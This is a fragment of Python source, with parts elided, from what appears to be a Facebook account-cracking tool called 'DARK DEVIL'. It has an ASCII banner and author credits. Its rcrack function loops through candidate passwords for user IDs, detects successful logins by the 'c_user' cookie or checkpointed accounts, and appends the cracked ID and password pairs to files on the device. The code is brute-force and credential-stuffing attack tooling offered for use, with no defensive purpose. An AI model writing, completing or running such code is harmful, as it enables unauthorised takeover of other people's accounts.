...
`7MM"""Yb. `7MM"""YMM `7MMF'   `7MF'`7MMF'`7MMF'      
  MM    `Yb. MM    `7   `MA     ,V    MM    MM        
  MM     `Mb MM   d      VM:   ,V     MM    MM        
  MM      MM MMmmMM       MM.  M'     MM    MM        
  MM     ,MP MM   Y  ,    `MM A'      MM    MM      , 
  MM    ,dP' MM     ,M     :MM;       MM    MM     ,M 
.JMMmmmdP' .JMMmmmmMMM      VF      .JMML..JMMmmmmMMM 
                                                                                                                                    
       ┌━━━━━━━━━━━━━━━━━ DEVIL ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   : DARK DEVIL        
               \033[1;91mFACEBOK      :  OMI HASAN               
               \033[1;97mGITHUB       :  OMIdark   
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO  DARK DEVIL  TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[DEVIL\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/DEVIL-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[DEVIL-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/DEVIL-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
